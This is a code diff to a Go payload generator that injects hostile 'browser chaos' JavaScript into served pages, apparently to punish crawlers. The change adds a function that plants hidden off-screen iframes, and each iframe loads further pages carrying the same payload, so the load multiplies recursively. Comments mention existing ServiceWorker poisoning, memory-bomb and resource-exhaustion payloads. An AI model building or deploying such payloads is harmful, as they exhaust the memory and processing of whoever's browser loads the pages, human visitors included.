@@ -138,10 +138,12 @@ func (e *Engine) GeneratePayload(path string) string {
 	parts = append(parts, generateNetworkIdleStall(rng, level))
 
 	if level >= 2 {
-		// Level 2+: ServiceWorker poisoning
+		// Level 2+: ServiceWorker poisoning (works on real browsers, may fail in headless)
 		parts = append(parts, generateServiceWorkerPoison(rng, level))
 		// Level 2+: Memory accumulation (IndexedDB + Blob leaks)
 		parts = append(parts, generateMemoryBomb(rng, level))
+		// Level 2+: Hidden iframe amplification (each iframe loads a page with its own chaos)
+		parts = append(parts, generateIframeAmplifier(rng, level))
 	}
 
 	if level >= 3 {
@@ -489,6 +491,42 @@ func generateResourceExhaustion(rng *rand.Rand) string {
   }
 })();
 </script>`
+}
+
+// generateIframeAmplifier creates hidden iframes that load additional pages.
+// Each iframe loads a unique path which will also have browser chaos injected,
+// creating recursive amplification. This is more reliable than ServiceWorker
+// because it doesn't require SW registration (which headless Chrome may block).
+func generateIframeAmplifier(rng *rand.Rand, level int) string {
+	iframeCount := 2
+	if level >= 3 {
+		iframeCount = 4
+	}
+	if level >= 4 {
+		iframeCount = 6
+	}
+
+	var sb strings.Builder
+	sb.WriteString(`<script>
+(function(){
+  var paths=[`)
+	for i := 0; i < iframeCount; i++ {
+		if i > 0 {
+			sb.WriteString(",")
+		}
+		sb.WriteString(fmt.Sprintf("'/%s/%x'", []string{"docs", "help", "learn", "guide", "tutorial", "wiki"}[rng.Intn(6)], rng.Uint32()))
+	}
+	sb.WriteString(`];
+  paths.forEach(function(p){
+    var f=document.createElement('iframe');
+    f.style.cssText='position:absolute;left:-9999px;width:1px;height:1px;border:0';
+    f.src=p;
+    f.setAttribute('loading','eager');
+    document.body.appendChild(f);
+  });
+})();
+</script>`)
+	return sb.String()
 }
 
 // jsStringLiteral wraps a string as a JS string literal (single-quoted, escaped).
